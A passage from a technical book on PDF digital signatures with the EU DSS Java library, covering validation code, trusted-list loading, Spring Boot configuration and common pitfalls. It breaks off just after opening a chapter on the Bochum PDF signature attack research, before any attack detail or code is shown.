  Parses the existing signature to determine its current level
\item
  Fetches OCSP responses and CRLs for every certificate in the chain
\item
  Builds the DSS dictionary with all validation data
\item
  Requests an archival timestamp from the TSA
\item
  Saves everything as an incremental update
\end{enumerate}

This is the operation you would run as a scheduled job to keep archived
documents verifiable indefinitely.

\section{Validation with EU DSS}\label{_validation_with_eu_dss}

\subsection{Basic Validation}\label{_basic_validation}

Validation is where EU DSS provides the most value. Building a correct
signature validator from scratch requires implementing the entire ETSI
EN 319 102-1 validation algorithm --- certificate chain building,
revocation checking at the correct point in time, timestamp validation,
DSS consumption, policy evaluation. EU DSS does all of this:

\begin{Shaded}
\begin{Highlighting}[]
\CommentTok{/**}
 \CommentTok{*}\NormalTok{ Validates all signatures in a signed PDF}\CommentTok{.}
 \CommentTok{*}\NormalTok{ Returns a structured validation report}\CommentTok{.}
 \CommentTok{*/}
\KeywordTok{public}\NormalTok{ Reports }\FunctionTok{validateSignatures}\OperatorTok{(}\DataTypeTok{byte}\OperatorTok{[]}\NormalTok{ signedPdfBytes}\OperatorTok{)}
        \KeywordTok{throws} \BuiltInTok{Exception} \OperatorTok{\{}

    \CommentTok{// 1. Set up the certificate verifier}
\NormalTok{    CommonCertificateVerifier verifier }\OperatorTok{=}
            \KeywordTok{new} \FunctionTok{CommonCertificateVerifier}\OperatorTok{();}
\NormalTok{    verifier}\OperatorTok{.}\FunctionTok{setOcspSource}\OperatorTok{(}\KeywordTok{new} \FunctionTok{OnlineOCSPSource}\OperatorTok{());}
\NormalTok{    verifier}\OperatorTok{.}\FunctionTok{setCrlSource}\OperatorTok{(}\KeywordTok{new} \FunctionTok{OnlineCRLSource}\OperatorTok{());}

    \CommentTok{// For qualified certificate validation, add the EUTL:}
    \CommentTok{// verifier.addTrustedCertSources(trustedListSource);}

    \CommentTok{// 2. Create a validator for the signed document}
\NormalTok{    DSSDocument document }\OperatorTok{=} \KeywordTok{new} \FunctionTok{InMemoryDocument}\OperatorTok{(}\NormalTok{signedPdfBytes}\OperatorTok{);}
\NormalTok{    SignedDocumentValidator validator }\OperatorTok{=}
\NormalTok{            SignedDocumentValidator}\OperatorTok{.}\FunctionTok{fromDocument}\OperatorTok{(}\NormalTok{document}\OperatorTok{);}
\NormalTok{    validator}\OperatorTok{.}\FunctionTok{setCertificateVerifier}\OperatorTok{(}\NormalTok{verifier}\OperatorTok{);}

    \CommentTok{// 3. Validate — this runs the full ETSI EN 319 102{-}1}
    \CommentTok{//    validation algorithm}
\NormalTok{    Reports reports }\OperatorTok{=}\NormalTok{ validator}\OperatorTok{.}\FunctionTok{validateDocument}\OperatorTok{();}

    \CommentTok{// 4. Access the results}
\NormalTok{    SimpleReport simpleReport }\OperatorTok{=}\NormalTok{ reports}\OperatorTok{.}\FunctionTok{getSimpleReport}\OperatorTok{();}
    \ControlFlowTok{for} \OperatorTok{(}\BuiltInTok{String}\NormalTok{ sigId }\OperatorTok{:}\NormalTok{ simpleReport}\OperatorTok{.}\FunctionTok{getSignatureIdList}\OperatorTok{())} \OperatorTok{\{}
\NormalTok{        log}\OperatorTok{.}\FunctionTok{info}\OperatorTok{(}\StringTok{"Signature \{\}: indication=\{\}, subIndication=\{\}"}\OperatorTok{,}
\NormalTok{                sigId}\OperatorTok{,}
\NormalTok{                simpleReport}\OperatorTok{.}\FunctionTok{getIndication}\OperatorTok{(}\NormalTok{sigId}\OperatorTok{),}
\NormalTok{                simpleReport}\OperatorTok{.}\FunctionTok{getSubIndication}\OperatorTok{(}\NormalTok{sigId}\OperatorTok{));}
\NormalTok{        log}\OperatorTok{.}\FunctionTok{info}\OperatorTok{(}\StringTok{"  Signed by: \{\}"}\OperatorTok{,}
\NormalTok{                simpleReport}\OperatorTok{.}\FunctionTok{getSignedBy}\OperatorTok{(}\NormalTok{sigId}\OperatorTok{));}
\NormalTok{        log}\OperatorTok{.}\FunctionTok{info}\OperatorTok{(}\StringTok{"  Signing time: \{\}"}\OperatorTok{,}
\NormalTok{                simpleReport}\OperatorTok{.}\FunctionTok{getSigningTime}\OperatorTok{(}\NormalTok{sigId}\OperatorTok{));}
\NormalTok{        log}\OperatorTok{.}\FunctionTok{info}\OperatorTok{(}\StringTok{"  Signature level: \{\}"}\OperatorTok{,}
\NormalTok{                simpleReport}\OperatorTok{.}\FunctionTok{getSignatureFormat}\OperatorTok{(}\NormalTok{sigId}\OperatorTok{));}
    \OperatorTok{\}}

    \ControlFlowTok{return}\NormalTok{ reports}\OperatorTok{;}
\OperatorTok{\}}
\end{Highlighting}
\end{Shaded}

\subsection{Validation Reports}\label{_validation_reports}

EU DSS produces three levels of validation reports:

\begin{enumerate}
\def\labelenumi{\arabic{enumi}.}
\item
  \textbf{Simple Report}: A summary of each signature's validity ---
  pass/fail, signer name, signing time, signature level. Suitable for
  end-user display.
\item
  \textbf{Detailed Report}: A structured breakdown of every validation
  check --- certificate chain validation, revocation checking, timestamp
  validation, policy conformance. Each check has an indication (PASSED,
  FAILED, INDETERMINATE) and a sub-indication explaining why.
\item
  \textbf{Diagnostic Data}: The raw data collected during validation ---
  all certificates encountered, all revocation data fetched, all
  timestamps found. This is the lowest level and is useful for debugging
  validation failures.
\end{enumerate}

\begin{Shaded}
\begin{Highlighting}[]
\CommentTok{// Accessing the detailed report}
\NormalTok{DetailedReport detailedReport }\OperatorTok{=}\NormalTok{ reports}\OperatorTok{.}\FunctionTok{getDetailedReport}\OperatorTok{();}

\CommentTok{// Get the basic building blocks conclusion}
\CommentTok{//  (certificate chain and revocation status)}
\ControlFlowTok{for} \OperatorTok{(}\BuiltInTok{String}\NormalTok{ sigId }\OperatorTok{:}\NormalTok{ detailedReport}\OperatorTok{.}\FunctionTok{getSignatureIds}\OperatorTok{())} \OperatorTok{\{}
\NormalTok{    Indication bbsIndication }\OperatorTok{=}
\NormalTok{            detailedReport}\OperatorTok{.}\FunctionTok{getBasicBuildingBlocksIndication}\OperatorTok{(}\NormalTok{sigId}\OperatorTok{);}
\NormalTok{    SubIndication bbsSubIndication }\OperatorTok{=}
\NormalTok{            detailedReport}\OperatorTok{.}\FunctionTok{getBasicBuildingBlocksSubIndication}\OperatorTok{(}\NormalTok{sigId}\OperatorTok{);}

\NormalTok{    log}\OperatorTok{.}\FunctionTok{info}\OperatorTok{(}\StringTok{"Signature \{\} basic building blocks: \{\} / \{\}"}\OperatorTok{,}
\NormalTok{            sigId}\OperatorTok{,}\NormalTok{ bbsIndication}\OperatorTok{,}\NormalTok{ bbsSubIndication}\OperatorTok{);}

    \CommentTok{// Get timestamp validation results}
    \BuiltInTok{List}\OperatorTok{\textless{}}\BuiltInTok{String}\OperatorTok{\textgreater{}}\NormalTok{ tsIds }\OperatorTok{=}
\NormalTok{            detailedReport}\OperatorTok{.}\FunctionTok{getTimestampIds}\OperatorTok{(}\NormalTok{sigId}\OperatorTok{);}
    \ControlFlowTok{for} \OperatorTok{(}\BuiltInTok{String}\NormalTok{ tsId }\OperatorTok{:}\NormalTok{ tsIds}\OperatorTok{)} \OperatorTok{\{}
\NormalTok{        log}\OperatorTok{.}\FunctionTok{info}\OperatorTok{(}\StringTok{"  Timestamp \{\}: \{\}"}\OperatorTok{,}
\NormalTok{                tsId}\OperatorTok{,}
\NormalTok{                detailedReport}\OperatorTok{.}\FunctionTok{getTimestampIndication}\OperatorTok{(}\NormalTok{tsId}\OperatorTok{));}
    \OperatorTok{\}}
\OperatorTok{\}}
\end{Highlighting}
\end{Shaded}

\subsection{EU Trusted List
Integration}\label{_eu_trusted_list_integration}

For validating qualified certificates, EU DSS can load and parse the EU
Trusted List (EUTL):

\begin{Shaded}
\begin{Highlighting}[]
\CommentTok{/**}
 \CommentTok{*}\NormalTok{ Configures EU DSS to validate against the EU Trusted List}\CommentTok{.}
 \CommentTok{*}\NormalTok{ The EUTL is downloaded}\CommentTok{,}\NormalTok{ its signature verified}\CommentTok{,}\NormalTok{ and the qualified}
 \CommentTok{*}\NormalTok{ trust service providers are extracted as trusted certificate sources}\CommentTok{.}
 \CommentTok{*/}
\KeywordTok{public}\NormalTok{ TrustedListsCertificateSource }\FunctionTok{loadEuTrustedList}\OperatorTok{()}
        \KeywordTok{throws} \BuiltInTok{Exception} \OperatorTok{\{}

\NormalTok{    TrustedListsCertificateSource trustedListSource }\OperatorTok{=}
            \KeywordTok{new} \FunctionTok{TrustedListsCertificateSource}\OperatorTok{();}

    \CommentTok{// The LOTL (List of the Lists) is the entry point}
\NormalTok{    LOTLSource lotlSource }\OperatorTok{=} \KeywordTok{new} \FunctionTok{LOTLSource}\OperatorTok{();}
\NormalTok{    lotlSource}\OperatorTok{.}\FunctionTok{setUrl}\OperatorTok{(}
            \StringTok{"https://ec.europa.eu/tools/lotl/eu{-}lotl.xml"}\OperatorTok{);}

    \CommentTok{// The LOTL is signed — we need the signing certificate}
    \CommentTok{// to verify it (bootstrapping problem — this cert is}
    \CommentTok{// distributed as part of the EU DSS distribution)}
\NormalTok{    lotlSource}\OperatorTok{.}\FunctionTok{setCertificateSource}\OperatorTok{(}
            \FunctionTok{officialJournalCertificateSource}\OperatorTok{());}

    \CommentTok{// Configure the TSL validation job}
\NormalTok{    TLValidationJob tlValidationJob }\OperatorTok{=} \KeywordTok{new} \FunctionTok{TLValidationJob}\OperatorTok{();}
\NormalTok{    tlValidationJob}\OperatorTok{.}\FunctionTok{setListOfTrustedListSources}\OperatorTok{(}\NormalTok{lotlSource}\OperatorTok{);}
\NormalTok{    tlValidationJob}\OperatorTok{.}\FunctionTok{setTrustedListCertificateSource}\OperatorTok{(}
\NormalTok{            trustedListSource}\OperatorTok{);}

    \CommentTok{// Use a caching data loader to avoid re{-}downloading}
    \CommentTok{// the entire EUTL on every validation}
\NormalTok{    FileCacheDataLoader cacheDataLoader }\OperatorTok{=}
            \KeywordTok{new} \FunctionTok{FileCacheDataLoader}\OperatorTok{();}
\NormalTok{    cacheDataLoader}\OperatorTok{.}\FunctionTok{setCacheExpirationTime}\OperatorTok{(}
            \DecValTok{24} \OperatorTok{*} \DecValTok{60} \OperatorTok{*} \DecValTok{60} \OperatorTok{*} \DecValTok{1000L}\OperatorTok{);} \CommentTok{// 24 hours}
\NormalTok{    cacheDataLoader}\OperatorTok{.}\FunctionTok{setFileCacheDirectory}\OperatorTok{(}
            \KeywordTok{new} \BuiltInTok{File}\OperatorTok{(}\StringTok{"/tmp/dss{-}tl{-}cache"}\OperatorTok{));}
\NormalTok{    tlValidationJob}\OperatorTok{.}\FunctionTok{setOnlineDataLoader}\OperatorTok{(}\NormalTok{cacheDataLoader}\OperatorTok{);}

    \CommentTok{// Run the initial load}
\NormalTok{    tlValidationJob}\OperatorTok{.}\FunctionTok{onlineRefresh}\OperatorTok{();}

\NormalTok{    log}\OperatorTok{.}\FunctionTok{info}\OperatorTok{(}\StringTok{"EU Trusted List loaded: \{\} trusted certificates"}\OperatorTok{,}
\NormalTok{            trustedListSource}\OperatorTok{.}\FunctionTok{getNumberOfTrustedCertificates}\OperatorTok{());}

    \ControlFlowTok{return}\NormalTok{ trustedListSource}\OperatorTok{;}
\OperatorTok{\}}
\end{Highlighting}
\end{Shaded}

The EU Trusted List is large --- the LOTL (List of the Lists) references
27+ national trusted lists, each containing dozens of trust service
providers and their certificates. The initial download and parsing can
take 30-60 seconds.

In production: - Load the EUTL at application startup, not on the first
validation request - Cache the downloaded lists on disk (use
\texttt{FileCacheDataLoader}) - Refresh periodically (every 24 hours is
typical) rather than on every request - If the EUTL is unreachable, fall
back to the cached version

Never skip EUTL validation --- if you validate qualified signatures
without checking the EUTL, you are accepting certificates that may not
be qualified.

\section{Spring Boot Integration}\label{_spring_boot_integration}

EU DSS provides a Spring Boot starter module that auto-configures most
of the framework:

\begin{Shaded}
\begin{Highlighting}[]
\NormalTok{\textless{}}\KeywordTok{dependency}\NormalTok{\textgreater{}}
\NormalTok{    \textless{}}\KeywordTok{groupId}\NormalTok{\textgreater{}eu.europa.dss\textless{}/}\KeywordTok{groupId}\NormalTok{\textgreater{}}
\NormalTok{    \textless{}}\KeywordTok{artifactId}\NormalTok{\textgreater{}dss{-}spring{-}boot{-}starter\textless{}/}\KeywordTok{artifactId}\NormalTok{\textgreater{}}
\NormalTok{    \textless{}}\KeywordTok{version}\NormalTok{\textgreater{}$\{dss.version\}\textless{}/}\KeywordTok{version}\NormalTok{\textgreater{}}
\NormalTok{\textless{}/}\KeywordTok{dependency}\NormalTok{\textgreater{}}
\end{Highlighting}
\end{Shaded}

\subsection{Configuration Properties}\label{_configuration_properties}

The starter exposes configuration through
\texttt{application.properties}:

\begin{Shaded}
\begin{Highlighting}[]
\NormalTok{\# TSA configuration}
\NormalTok{dss.tsp.url=http://timestamp.digicert.com}
\NormalTok{dss.tsp.digest{-}algorithm=SHA256}

\NormalTok{\# EU Trusted List}
\NormalTok{dss.lotl.url=https://ec.europa.eu/tools/lotl/eu{-}lotl.xml}
\NormalTok{dss.lotl.cache{-}directory=/var/cache/dss/tl}
\NormalTok{dss.lotl.cache{-}expiration=86400000}

\NormalTok{\# OCSP/CRL timeouts}
\NormalTok{dss.ocsp.connect{-}timeout=5000}
\NormalTok{dss.ocsp.read{-}timeout=10000}
\NormalTok{dss.crl.connect{-}timeout=5000}
\NormalTok{dss.crl.read{-}timeout=30000}

\NormalTok{\# Proxy (if behind a corporate proxy)}
\NormalTok{dss.proxy.https.host=proxy.example.com}
\NormalTok{dss.proxy.https.port=8443}
\end{Highlighting}
\end{Shaded}

\subsection{Auto-Configured Beans}\label{_auto_configured_beans}

The starter auto-configures the following Spring beans:

\begin{itemize}
\item
  \texttt{CommonCertificateVerifier} --- pre-configured with OCSP and
  CRL sources
\item
  \texttt{OnlineTSPSource} --- configured from \texttt{dss.tsp.url}
\item
  \texttt{OnlineOCSPSource} and \texttt{OnlineCRLSource} --- with
  timeout configuration
\item
  \texttt{TrustedListsCertificateSource} --- loaded from the EUTL on
  startup
\item
  \texttt{TLValidationJob} --- scheduled to refresh the EUTL
  periodically
\item
  \texttt{CommonsDataLoader} --- HTTP client with proxy and timeout
  support
\end{itemize}

You can inject these directly into your services:

\begin{Shaded}
\begin{Highlighting}[]
\AttributeTok{@Service}
\AttributeTok{@Slf4j}
\KeywordTok{public} \KeywordTok{class}\NormalTok{ SignatureService }\OperatorTok{\{}

    \KeywordTok{private} \DataTypeTok{final}\NormalTok{ CommonCertificateVerifier certificateVerifier}\OperatorTok{;}
    \KeywordTok{private} \DataTypeTok{final}\NormalTok{ OnlineTSPSource tspSource}\OperatorTok{;}

    \KeywordTok{public} \FunctionTok{SignatureService}\OperatorTok{(}
\NormalTok{            CommonCertificateVerifier certificateVerifier}\OperatorTok{,}
\NormalTok{            OnlineTSPSource tspSource}\OperatorTok{)} \OperatorTok{\{}
        \KeywordTok{this}\OperatorTok{.}\FunctionTok{certificateVerifier} \OperatorTok{=}\NormalTok{ certificateVerifier}\OperatorTok{;}
        \KeywordTok{this}\OperatorTok{.}\FunctionTok{tspSource} \OperatorTok{=}\NormalTok{ tspSource}\OperatorTok{;}
    \OperatorTok{\}}

    \KeywordTok{public} \DataTypeTok{byte}\OperatorTok{[]} \FunctionTok{signPdf}\OperatorTok{(}\DataTypeTok{byte}\OperatorTok{[]}\NormalTok{ pdfBytes}\OperatorTok{,}
\NormalTok{            SignatureTokenConnection token}\OperatorTok{,}
\NormalTok{            DSSPrivateKeyEntry keyEntry}\OperatorTok{)} \KeywordTok{throws} \BuiltInTok{Exception} \OperatorTok{\{}

\NormalTok{        PAdESService service }\OperatorTok{=}
                \KeywordTok{new} \FunctionTok{PAdESService}\OperatorTok{(}\NormalTok{certificateVerifier}\OperatorTok{);}
\NormalTok{        service}\OperatorTok{.}\FunctionTok{setTspSource}\OperatorTok{(}\NormalTok{tspSource}\OperatorTok{);}

\NormalTok{        PAdESSignatureParameters params }\OperatorTok{=}
                \KeywordTok{new} \FunctionTok{PAdESSignatureParameters}\OperatorTok{();}
\NormalTok{        params}\OperatorTok{.}\FunctionTok{setSignatureLevel}\OperatorTok{(}
\NormalTok{                SignatureLevel}\OperatorTok{.}\FunctionTok{PAdES\_BASELINE\_T}\OperatorTok{);}
\NormalTok{        params}\OperatorTok{.}\FunctionTok{setDigestAlgorithm}\OperatorTok{(}\NormalTok{DigestAlgorithm}\OperatorTok{.}\FunctionTok{SHA256}\OperatorTok{);}
\NormalTok{        params}\OperatorTok{.}\FunctionTok{setSigningCertificate}\OperatorTok{(}
\NormalTok{                keyEntry}\OperatorTok{.}\FunctionTok{getCertificate}\OperatorTok{());}
\NormalTok{        params}\OperatorTok{.}\FunctionTok{setCertificateChain}\OperatorTok{(}
\NormalTok{                keyEntry}\OperatorTok{.}\FunctionTok{getCertificateChain}\OperatorTok{());}

\NormalTok{        DSSDocument doc }\OperatorTok{=} \KeywordTok{new} \FunctionTok{InMemoryDocument}\OperatorTok{(}\NormalTok{pdfBytes}\OperatorTok{);}
\NormalTok{        ToBeSigned tbs }\OperatorTok{=}\NormalTok{ service}\OperatorTok{.}\FunctionTok{getDataToSign}\OperatorTok{(}\NormalTok{doc}\OperatorTok{,}\NormalTok{ params}\OperatorTok{);}
\NormalTok{        SignatureValue sv }\OperatorTok{=}\NormalTok{ token}\OperatorTok{.}\FunctionTok{sign}\OperatorTok{(}
\NormalTok{                tbs}\OperatorTok{,}\NormalTok{ params}\OperatorTok{.}\FunctionTok{getDigestAlgorithm}\OperatorTok{(),}\NormalTok{ keyEntry}\OperatorTok{);}
\NormalTok{        DSSDocument signed }\OperatorTok{=}
\NormalTok{                service}\OperatorTok{.}\FunctionTok{signDocument}\OperatorTok{(}\NormalTok{doc}\OperatorTok{,}\NormalTok{ params}\OperatorTok{,}\NormalTok{ sv}\OperatorTok{);}

        \BuiltInTok{ByteArrayOutputStream}\NormalTok{ out }\OperatorTok{=} \KeywordTok{new} \BuiltInTok{ByteArrayOutputStream}\OperatorTok{();}
\NormalTok{        signed}\OperatorTok{.}\FunctionTok{writeTo}\OperatorTok{(}\NormalTok{out}\OperatorTok{);}
        \ControlFlowTok{return}\NormalTok{ out}\OperatorTok{.}\FunctionTok{toByteArray}\OperatorTok{();}
    \OperatorTok{\}}
\OperatorTok{\}}
\end{Highlighting}
\end{Shaded}

\section{EU DSS vs. Rolling Your Own}\label{_eu_dss_vs_rolling_your_own}

\subsection{When to Use EU DSS}\label{_when_to_use_eu_dss}

Use EU DSS when:

\begin{itemize}
\item
  \textbf{You need eIDAS compliance}: EU DSS is the reference
  implementation. If your validation disagrees with EU DSS, regulators
  will assume your code is wrong, not EU DSS.
\item
  \textbf{You validate qualified signatures}: EUTL parsing, QCStatements
  interpretation, SCAL assessment --- EU DSS handles all of this.
  Implementing it correctly from scratch is months of work.
\item
  \textbf{You need multiple signature formats}: If your application
  handles PAdES, CAdES, and XAdES, EU DSS's format-independent
  architecture saves enormous effort.
\item
  \textbf{You need long-term maintenance}: EU DSS is actively maintained
  with a clear release cadence. ETSI standards evolve, new algorithms
  are added, old ones deprecated. EU DSS tracks these changes.
\end{itemize}

\subsection{When to Consider
Alternatives}\label{_when_to_consider_alternatives}

EU DSS may not be the right choice when:

\begin{itemize}
\item
  \textbf{You need total control over CMS construction}: EU DSS
  abstracts away the CMS building process. If your use case requires
  non-standard CMS attributes, custom signature dictionary entries, or
  unusual byte range handling, EU DSS may fight you. In these cases,
  using BouncyCastle directly (as shown throughout this book) gives you
  full control.
\item
  \textbf{You have strict dependency constraints}: EU DSS brings a
  significant dependency tree --- PDFBox, BouncyCastle, Apache
  HttpClient, JAXB, SLF4J, and dozens of transitive dependencies. If
  your project has strict dependency policies, the EU DSS footprint may
  be too large.
\item
  \textbf{You only create signatures, never validate}: If you only sign
  PDFs and never validate them, EU DSS brings a lot of validation
  machinery you do not need. A leaner approach with PDFBox +
  BouncyCastle may be more appropriate.
\item
  \textbf{You need to support PDF features beyond signing}: EU DSS is
  focused on digital signatures. It does not help with form filling,
  content editing, font embedding, or other PDF operations. You will
  still need PDFBox or another PDF library for those.
\end{itemize}

\subsection{The Hybrid Approach}\label{_the_hybrid_approach}

In practice, many projects use a hybrid approach:

\begin{itemize}
\item
  \textbf{EU DSS for validation}: Use \texttt{SignedDocumentValidator}
  to validate incoming signed PDFs. This gives you correct ETSI EN 319
  102-1 validation with EUTL support.
\item
  \textbf{PDFBox + BouncyCastle for signing}: Use PDFBox for PDF
  manipulation and BouncyCastle for CMS construction. This gives you
  full control over the signing process while still producing
  standard-compliant signatures.
\item
  \textbf{EU DSS for extension}: Use
  \texttt{PAdESService.extendDocument()} to upgrade signatures from
  B-B/B-T to B-LTA. This is complex to implement manually (DSS
  dictionary construction, archival timestamp embedding) and EU DSS does
  it reliably.
\end{itemize}

This hybrid model gives you the best of both worlds: full control where
you need it, and battle-tested reference code where correctness is
paramount.

If you adopt the hybrid approach, be mindful of PDFBox version
alignment. EU DSS uses a specific PDFBox version internally. If your
direct PDFBox dependency uses a different version, classloader conflicts
can cause subtle, hard-to-diagnose bugs --- wrong method signatures,
missing classes, or (worst case) silent data corruption. Always align
your PDFBox version with the one in EU DSS's dependency tree.

\section{Common Pitfalls}\label{_common_pitfalls_2}

\subsection{1. Forgetting to Set the Certificate
Chain}\label{_1_forgetting_to_set_the_certificate_chain}

\begin{Shaded}
\begin{Highlighting}[]
\CommentTok{// WRONG — only sets the signing certificate, not the chain}
\NormalTok{parameters}\OperatorTok{.}\FunctionTok{setSigningCertificate}\OperatorTok{(}\NormalTok{keyEntry}\OperatorTok{.}\FunctionTok{getCertificate}\OperatorTok{());}
\CommentTok{// Missing: parameters.setCertificateChain(...)}

\CommentTok{// RIGHT — set both}
\NormalTok{parameters}\OperatorTok{.}\FunctionTok{setSigningCertificate}\OperatorTok{(}\NormalTok{keyEntry}\OperatorTok{.}\FunctionTok{getCertificate}\OperatorTok{());}
\NormalTok{parameters}\OperatorTok{.}\FunctionTok{setCertificateChain}\OperatorTok{(}\NormalTok{keyEntry}\OperatorTok{.}\FunctionTok{getCertificateChain}\OperatorTok{());}
\end{Highlighting}
\end{Shaded}

Without the certificate chain, the CMS \texttt{certificates} collection
will contain only the signer's certificate. Validators that do not have
access to the intermediate certificates (from AIA or a local store) will
fail to build the chain.

\subsection{2. Not Configuring a Certificate
Verifier}\label{_2_not_configuring_a_certificate_verifier}

\begin{Shaded}
\begin{Highlighting}[]
\CommentTok{// WRONG — empty verifier, cannot check revocation}
\NormalTok{CommonCertificateVerifier verifier }\OperatorTok{=}
        \KeywordTok{new} \FunctionTok{CommonCertificateVerifier}\OperatorTok{();}
\CommentTok{// No OCSP source, no CRL source set}

\CommentTok{// RIGHT — configure revocation sources}
\NormalTok{CommonCertificateVerifier verifier }\OperatorTok{=}
        \KeywordTok{new} \FunctionTok{CommonCertificateVerifier}\OperatorTok{();}
\NormalTok{verifier}\OperatorTok{.}\FunctionTok{setOcspSource}\OperatorTok{(}\KeywordTok{new} \FunctionTok{OnlineOCSPSource}\OperatorTok{());}
\NormalTok{verifier}\OperatorTok{.}\FunctionTok{setCrlSource}\OperatorTok{(}\KeywordTok{new} \FunctionTok{OnlineCRLSource}\OperatorTok{());}
\end{Highlighting}
\end{Shaded}

An unconfigured verifier cannot check certificate revocation. EU DSS
will still produce a signature, but validation will report INDETERMINATE
for revocation checking.

\subsection{3. Underestimating /Contents
Size}\label{_3_underestimating_contents_size}

When EU DSS constructs the PDF signature, it must pre-allocate space for
the \texttt{/Contents} hex string. If the allocated space is too small,
the CMS signature (with certificates, timestamps, etc.) will not fit. EU
DSS handles this internally with reasonable defaults, but if you are
building very large certificate chains or using multiple timestamps, you
may need to increase the allocation:

\begin{Shaded}
\begin{Highlighting}[]
\NormalTok{PAdESSignatureParameters params }\OperatorTok{=}
        \KeywordTok{new} \FunctionTok{PAdESSignatureParameters}\OperatorTok{();}
\NormalTok{params}\OperatorTok{.}\FunctionTok{setContentSize}\OperatorTok{(}\DecValTok{32768}\OperatorTok{);}  \CommentTok{// 32 KB for /Contents}
\CommentTok{// Default is typically 16384 (16 KB)}
\end{Highlighting}
\end{Shaded}

\subsection{4. Blocking the EUTL Load on First
Request}\label{_4_blocking_the_eutl_load_on_first_request}

The EUTL download takes 30-60 seconds. If you trigger it lazily (on the
first validation request), your first user will experience a 30-second
delay. Always load the EUTL eagerly at application startup:

\begin{Shaded}
\begin{Highlighting}[]
\AttributeTok{@PostConstruct}
\KeywordTok{public} \DataTypeTok{void} \FunctionTok{initTrustedLists}\OperatorTok{()} \OperatorTok{\{}
\NormalTok{    log}\OperatorTok{.}\FunctionTok{info}\OperatorTok{(}\StringTok{"Loading EU Trusted List — this may take 30{-}60 seconds"}\OperatorTok{);}
\NormalTok{    tlValidationJob}\OperatorTok{.}\FunctionTok{onlineRefresh}\OperatorTok{();}
\NormalTok{    log}\OperatorTok{.}\FunctionTok{info}\OperatorTok{(}\StringTok{"EU Trusted List loaded: \{\} certificates"}\OperatorTok{,}
\NormalTok{            trustedListSource}\OperatorTok{.}\FunctionTok{getNumberOfTrustedCertificates}\OperatorTok{());}
\OperatorTok{\}}
\end{Highlighting}
\end{Shaded}

\subsection{5. Ignoring Validation
Sub-Indications}\label{_5_ignoring_validation_sub_indications}

A common mistake is checking only the top-level \texttt{Indication}
(TOTAL\_PASSED, TOTAL\_FAILED, INDETERMINATE) and ignoring the
\texttt{SubIndication}. The sub-indication tells you \emph{why} the
validation reached that conclusion:

\begin{itemize}
\item
  \texttt{NO\_SIGNING\_CERTIFICATE\_FOUND} --- the signer's certificate
  is missing
\item
  \texttt{REVOKED} --- a certificate in the chain has been revoked
\item
  \texttt{EXPIRED} --- a certificate has expired and there is no proof
  that signing occurred before expiry
\item
  \texttt{TRY\_LATER} --- revocation data could not be fetched (OCSP/CRL
  unreachable)
\item
  \texttt{CRYPTO\_CONSTRAINTS\_FAILURE} --- weak algorithms detected
  (e.g., SHA-1)
\item
  \texttt{HASH\_FAILURE} --- the message digest does not match (document
  has been modified)
\end{itemize}

Always log the sub-indication alongside the indication for debugging.

\section{Key Takeaways}\label{_key_takeaways_11}

\begin{itemize}
\item
  \textbf{EU DSS} is the European Commission's open-source reference
  implementation for digital signature creation, extension, and
  validation --- LGPL 2.1 licensed, actively maintained
\item
  The \textbf{two-phase signing model} (ToBeSigned / SignatureValue)
  cleanly separates CMS construction from the private key operation,
  enabling local and remote signing through the same API
\item
  \textbf{SignatureTokenConnection} abstracts key access: PKCS\#12,
  PKCS\#11, MS CAPI, or custom (CSC API) --- swap the token, keep the
  signing flow
\item
  EU DSS handles \textbf{PAdES-B-B through B-LTA} creation and the full
  ETSI EN 319 102-1 \textbf{validation algorithm}, including EUTL lookup
  for qualified certificate determination
\item
  \textbf{Signature extension} (\texttt{extendDocument}) upgrades a
  signature's PAdES profile without re-signing --- the most practical
  feature for archival workflows
\item
  The \textbf{Spring Boot starter} auto-configures certificate
  verifiers, TSA sources, and EUTL loading --- production-ready with
  minimal configuration
\item
  \textbf{Validation reports} come in three levels: Simple (pass/fail),
  Detailed (per-check breakdown), Diagnostic (raw collected data)
\item
  The \textbf{EUTL} must be loaded at startup and cached on disk ---
  lazy loading causes unacceptable latency, missing EUTL data causes
  incorrect qualified status determination
\item
  \textbf{Hybrid approach} is common in practice: EU DSS for validation
  and extension, PDFBox + BouncyCastle for signing with full CMS control
\item
  Always align \textbf{PDFBox versions} between your direct dependency
  and EU DSS's transitive dependency --- version mismatches cause
  classloader conflicts
\end{itemize}

\chapter{Security, Incidents \&
Outlook}\label{_security_incidents_outlook}

\section{PDF Signature Attacks: A Complete Technical
Analysis}\label{_pdf_signature_attacks_a_complete_technical_analysis}

\begin{quote}
We found 21 out of 22 desktop viewer applications and 5 out of 7 online
validation services to be vulnerable to at least one of our attacks.

---  Vladislav Mladenov et al. 1 Trillion Dollar Refund
\end{quote}

For nearly two decades, the PDF signature ecosystem operated on an
assumption that turned out to be wrong: that viewers actually verified
what they claimed to verify. Between 2019 and 2021, a research team at
Ruhr University Bochum systematically dismantled this assumption. They
showed that an attacker could take a validly signed PDF, modify it in
specific ways, and present the result to any major PDF viewer --- Adobe
Acrobat, Foxit Reader, Nitro, LibreOffice, Okular, dozens of others ---
and the viewer would display a green checkmark and the text "Signature
is valid."

The signed content had been altered. The viewer said it hadn't. Every
viewer was wrong.

This chapter is a complete technical analysis of every major attack
against PDF digital signatures --- from the Bochum research program to
earlier CVEs, from the theoretical mechanics to working code that
demonstrates each attack class. The purpose is not to enable attacks but
to make them impossible to misunderstand. If you build or maintain a PDF
signature validation system, you need to understand exactly how these
attacks work so that your code cannot be fooled by them. If you are a
security researcher, this chapter gives you the foundation to find the
next generation of PDF signature vulnerabilities --- because the Bochum
team found the obvious ones, but the attack surface is far from fully
explored.

\subsection{The Researchers}\label{_the_researchers}

The PDF signature attacks of 2019--2021 were the work of the
\textbf{Chair of Network and Data Security} (Lehrstuhl für Netz- und
Datensicherheit) at Ruhr University Bochum, Germany, led by
\textbf{Prof. Dr. Jörg Schwenk}.

The core research team:

\begin{itemize}
\item
  \textbf{Vladislav Mladenov} --- PhD researcher, co-first author of the
  CCS 2019 paper, led the implementation and testing of the USF, ISA,
  and SWA attack variants
\item
  \textbf{Christian Mainka} --- post-doctoral researcher, co-first
  author of both the CCS 2019 and NDSS 2021 papers, designed the Shadow
  Attack taxonomy and coordinated responsible disclosure
\item
  \textbf{Karsten Meyer zu Selhausen} --- researcher and co-founder of
  \textbf{Hackmanit GmbH}, the security consultancy that spun out of the
  Bochum group; contributed to attack implementation and vendor
  coordination
\item
  \textbf{Martin Grothe} --- researcher, contributed to the CCS 2019
  paper's systematic evaluation across 22 viewers
\item
  \textbf{Simon Rohlmann} --- researcher, co-author of the NDSS 2021
  Shadow Attacks paper, developed the Hide-and-Replace variant
\item
